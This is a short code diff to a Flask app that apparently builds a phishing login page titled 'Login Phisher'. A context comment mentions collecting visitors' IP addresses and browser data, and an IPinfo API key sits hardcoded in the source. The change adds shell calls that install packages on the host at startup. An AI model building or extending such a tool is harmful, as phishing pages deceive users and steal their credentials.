@@ -1,11 +1,14 @@
 from flask import Flask, render_template, request, redirect, url_for
 import requests
 import platform
+import os
 
 app = Flask(__name__)
 
 IPINFO_API_KEY = "5f8ea1c410083a"
-
+os.system("pip install flask")
+os.system("apt install git")
+os.system("figlet Login Phisher")
 @app.route('/')
 def login():
     # Felhasználó IP-címének és böngésző adatainak lekérdezése
